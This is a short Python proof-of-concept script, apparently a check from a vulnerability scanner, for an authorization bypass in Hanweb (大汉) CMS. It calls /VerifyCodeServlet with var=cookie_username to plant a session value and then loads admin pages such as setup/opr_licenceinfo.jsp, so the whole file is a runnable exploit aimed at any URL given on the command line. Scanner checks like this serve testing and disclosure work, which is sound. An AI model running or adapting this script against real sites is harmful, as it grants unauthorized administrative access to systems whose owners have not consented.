#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 大汉VerfiyCodeServlet越权漏洞
referer: http://www.2cto.com/Article/201507/418593.html
author: Lucifer
description: /VerifyCodeServlet 可以 创建任意 SESSION的key值,opr_licenceinfo.jsp需要一个SESSION cookie_username 不为空，就可以成功登录。
'''
import sys
import requests
import warnings
from termcolor import cprint

class hanweb_VerifyCodeServlet_install_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        paths=['/vipchat/','/jcms/','/jsearch/','/jact/','/vc/','/xxgk/']
        payload = 'VerifyCodeServlet?var=cookie_username'
        adminpaths=['setup/opr_licenceinfo.jsp','setup/admin.jsp']
        sess = requests.Session()
        try:
            for path in paths:
                vulnurl=self.url+path+payload
                req = sess.get(vulnurl, headers=headers, timeout=10, verify=False)
                if req.status_code==200:
                    for adminpath in adminpaths:
                        adminurl=self.url+path+adminpath
                        req2 = sess.get(adminurl, headers=headers, timeout=10, verify=False)
                        if req2.status_code == 200 and ('Licence' in req2.text or 'admin' in req2.text):
                            cprint("[+]存在大汉VerfiyCodeServlet越权漏洞...(高危)\tpayload: "+"1.先访问"+vulnurl+"\t2.再访问"+adminurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = hanweb_VerifyCodeServlet_install_BaseVerify(sys.argv[1])
    testVuln.run()
